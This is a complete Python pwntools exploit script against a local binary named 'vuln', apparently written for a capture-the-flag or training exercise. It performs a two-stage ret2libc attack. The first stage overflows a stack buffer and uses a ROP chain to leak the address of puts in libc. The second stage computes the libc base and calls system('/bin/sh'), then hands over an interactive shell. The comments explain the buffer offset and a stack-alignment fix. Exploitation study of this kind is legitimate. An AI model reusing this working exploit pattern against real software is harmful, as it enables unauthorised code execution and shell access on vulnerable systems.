#!/usr/bin/env python3

from pwn import *

binary = "./vuln"
context.binary = binary
#context.log_level = "debug"

e = ELF(binary)
main_address = e.symbols[b"main"]
puts_plt_address = e.plt[b"puts"]
puts_got_address = e.got[b"puts"]
log.info("puts_plt_address: 0x{:016x}".format(puts_plt_address))
log.info("puts_got_address: 0x{:016x}".format(puts_got_address))

r = ROP(e)
pop_rdi_ret = r.find_gadget(["pop rdi", "ret"]).address
ret = r.find_gadget(["ret"]).address

# The offset from buffer to return address is determined by static analysis.
#
#  400586:       48 8d 45 e0             lea    rax,[rbp-0x20]
#  40058a:       be 80 00 00 00          mov    esi,0x80
#  40058f:       48 89 c7                mov    rdi,rax
#  400592:       e8 e9 fe ff ff          call   400480 <fgets@plt>
#
# The buffer is at rbp-0x20. The return address is at rbp+0x8. So the
# offset is rbp+0x8-(rbp-0x20) = 0x28
offset = 0x28

io = process(binary)

# 1st stage payload

payload = offset * b"A" + pack(pop_rdi_ret) + pack(puts_got_address) + pack(puts_plt_address) + pack(main_address)
log.info("1st stage payload: " + "".join("\\x{:02x}".format(i) for i in payload))

io.sendline(payload)
io.recvline()
msg = io.recvline()
msg = msg.strip()
msg = msg + (8-len(msg)) * b"\x00"
puts_address_in_libc = unpack(msg)
log.info("puts_address_in_libc: 0x{:016x}".format(puts_address_in_libc))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_offset_in_libc = libc.symbols[b"puts"]
log.info("puts_offset_in_libc: 0x{:016x}".format(puts_offset_in_libc))

libc_base_address = puts_address_in_libc - puts_offset_in_libc
libc.address = libc_base_address
log.info("libc_base_address: 0x{:016x}".format(libc.address))
system_address_in_libc = libc.symbols[b"system"]
log.info("system_address_in_libc: 0x{:016x}".format(system_address_in_libc))

sh_address_in_libc = next(libc.search(b"/bin/sh\x00"))
log.info("sh_address_in_libc: 0x{:016x}".format(sh_address_in_libc))

# 2nd stage payload

# Add a ret gadget that does nothing helpful (it simply jumps to the next
# address) to fix issue with stack alignment in do_system() for glibc 2.27:
# => 0x7f14bef6c2f6 <do_system+1094>:     movaps XMMWORD PTR [rsp+0x40],xmm0
payload = offset * b"A" + pack(ret) + pack(pop_rdi_ret) + pack(sh_address_in_libc) + pack(system_address_in_libc)
log.info("2nd stage 2nd stage payload: " + "".join("\\x{:02x}".format(i) for i in payload))

#gdb.attach(io)
io.sendline(payload)

io.interactive()
